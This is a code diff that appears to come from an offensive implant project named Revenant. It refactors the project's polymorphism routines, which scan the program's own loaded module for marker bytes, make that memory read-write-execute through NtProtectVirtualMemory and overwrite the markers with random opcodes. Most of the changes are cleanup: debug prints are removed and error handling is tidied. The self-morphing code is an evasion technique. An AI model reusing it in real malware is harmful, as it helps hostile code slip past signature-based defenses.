@@ -1,14 +1,15 @@
 //
 // Created by 0xtriboulet on 4/15/2023.
 //
+#include "Dbg.h"
 #include "Asm.h"
-#include "Config.h"
-#include "Poly.h"
-#include "Revenant.h"
-#include "Strings.h"
-#include "Obfuscation.h"
-#include "Utilities.h"
 #include "Defs.h"
+#include "Poly.h"
+#include "Config.h"
+#include "Strings.h"
+#include "Revenant.h"
+#include "Utilities.h"
+#include "Obfuscation.h"
 
 #include <tchar.h>
 
@@ -62,11 +63,8 @@ INT morphModule() {
             DWORD dwRegionCount = 0;
             unsigned char * marker_bytes = MARKER_BYTES;
             unsigned char markerAddr[MARKER_SIZE] = {0};
-            //_tprintf("MORPHMODULE 64\n");
-            //_tprintf("markerADDR 66: %p\n", markerAddr);
-            //__asm("int3");
+
             mem_cpy(markerAddr,marker_bytes,MARKER_SIZE);
-            //_tprintf("MORPHMODULE 69\n");
 
             // Iterate through memory regions of the current process's module to search for the marker pattern.
             while (!bMorphingFinished)
@@ -74,15 +72,15 @@ INT morphModule() {
 
                 // Call the findPattern function to search for the marker pattern in memory.
                 PVOID startAddr= (PVOID)modInfo.lpBaseOfDll;
-                //_tprintf("poly 72\n");
+
                 pbyLastMatch = findPattern(startAddr, modInfo.SizeOfImage, markerAddr, NULL, MARKER_SIZE);
-                //_tprintf("poly 74\n");
+
                 // If the marker pattern is found, replace it with random opcodes and update the offsets.
                 if (pbyLastMatch != NULL)
                 {
-                    //_tprintf("poly 78\n");
+
                     morphMemory(pbyLastMatch, (BYTE) MARKER_SIZE);
-                    //_tprintf("poly 80\n");
+
                 }
                     // If the marker pattern is not found, set the morphing status to finished.
                 else
@@ -162,10 +160,7 @@ int morphMemory(PBYTE pbyDst, BYTE byLength)
     size_t pbySize = sizeof(MARKER_BYTES);
 
     // set permissions
-    if((status = p_NtProtectVirtualMemory(NtCurrentProcess,&pbyDst, &pbySize,PAGE_EXECUTE_READWRITE,&dwOldProtect)) != 0){
-        //_tprintf("FAILED! RWX\n");
-        return -1;
-    }
+    check_debug(p_NtProtectVirtualMemory(NtCurrentProcess,&pbyDst, &pbySize,PAGE_EXECUTE_READWRITE,&dwOldProtect) == 0 , "NtProtectVirtualMemory (RWX) Failed!");
 
     // patch marker bytes
     mem_cpy((void *) pbyMarker,  (const void *) morphedOpcodes, (size_t) byLength);
@@ -187,9 +182,12 @@ int morphMemory(PBYTE pbyDst, BYTE byLength)
     VirtualProtect(pbyDst, byLength, dwOldProtect, &dwOldProtect);
 
 #endif //CONFIG NATIVE
-
+    LEAVE:
     // Free the memory allocated for the morphed opcodes
-    LocalFree(*(PVOID*)morphedOpcodes);
+    if(morphedOpcodes != NULL){
+        LocalFree(*(PVOID*)morphedOpcodes);
+    }
+
     return 0;
 }
 
